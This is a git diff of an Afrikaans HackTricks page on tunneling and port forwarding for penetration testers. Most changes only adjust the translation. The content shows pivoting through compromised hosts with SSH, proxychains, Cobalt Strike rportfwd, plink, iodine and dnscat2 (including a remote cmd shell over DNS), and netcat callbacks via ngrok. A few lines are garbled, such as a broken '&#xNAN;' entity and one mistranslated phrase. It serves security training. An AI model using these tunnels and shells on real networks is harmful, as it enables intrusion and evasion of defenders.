@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -47,7 +47,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Plaaslike Port2Port
 
-Maak nuwe Poort in SSH Bediener --> Ander poort
+Maak nuwe Poort in SSH-bediener --> Ander poort
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -65,7 +65,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
+Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -92,7 +92,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Stel forwarding op die bediener-kant in
+Stel forwarding op die bedienerkant in
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-In hierdie geval is die **poort geopen in die beacon gasheer**, nie in die Spanbediener nie en die verkeer word na die Spanbediener gestuur en van daar na die aangeduide gasheer:poort
+In hierdie geval, die **poort is oop in die beacon gasheer**, nie in die Team Server nie en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om te relay tussen individuele masjiene nie**.
-- Verkeer is **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
-- **Admin regte is nie nodig nie** om omgekeerde poort forwards op hoë poorte te skep.
+* Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om te relay tussen individuele masjiene nie**.
+* Verkeer is **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
+* **Admin regte is nie nodig nie** om omgekeerde poort forwards op hoë poorte te skep.
 
 ### rPort2Port lokaal
 
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Dit is soos 'n konsole PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh kliënt).
 
-Aangesien hierdie binaire in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
+Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -370,7 +370,7 @@ Nou kan ons **verbinde** met die **slagoffer** oor **RDP** met **`mstsc.exe`**, 
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Nou, bevestig op jou masjien (aanvaller) dat die poort 1080 luister:
+Nou, bevestig in jou masjien (aanvaller) dat die poort 1080 luister:
 ```
 netstat -antb | findstr 1080
 ```
@@ -394,7 +394,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit stuur poort 443 deur.
+Byvoorbeeld, dit gee die poort 443 deur.
 ```
 Username Alice
 Password P@ssw0rd
@@ -415,7 +415,7 @@ Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanva
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
+Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -445,14 +445,14 @@ Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershel
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Poort deurstuur met dnscat**
+#### **Haven forwarding met dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **verstek** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
+Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
 ## Tonnels in Go
 
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**
-*Blootstellings-URI is soos:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**\
+&#xNAN;_&#x45;xposition URI is soos:_ **UID.ngrok.io**
 
 ### Installasie
 
-- Skep 'n rekening: https://ngrok.com/signup
-- Kliënt aflaai:
+* Skep 'n rekening: https://ngrok.com/signup
+* Kliënt aflaai:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Dit is ook moontlik om outentisering en TLS by te voeg, indien nodig.*
+_Dit is ook moontlik om outentisering en TLS by te voeg, indien nodig._
 
 #### Tunneling TCP
 ```bash
@@ -516,14 +516,14 @@ chmod a+x ./ngrok
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Leker van lêers met HTTP
+#### Lêers blootstel met HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
 #### Sniffing HTTP calls
 
-*Nuttig vir XSS, SSRF, SSTI ...*
+_Nuttig vir XSS, SSRF, SSTI ..._\
 Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling interne HTTP-diens
@@ -536,8 +536,9 @@ Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.
 #### ngrok.yaml eenvoudige konfigurasie voorbeeld
 
 Dit open 3 tonnels:
-- 2 TCP
-- 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
 * Kontroleer die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
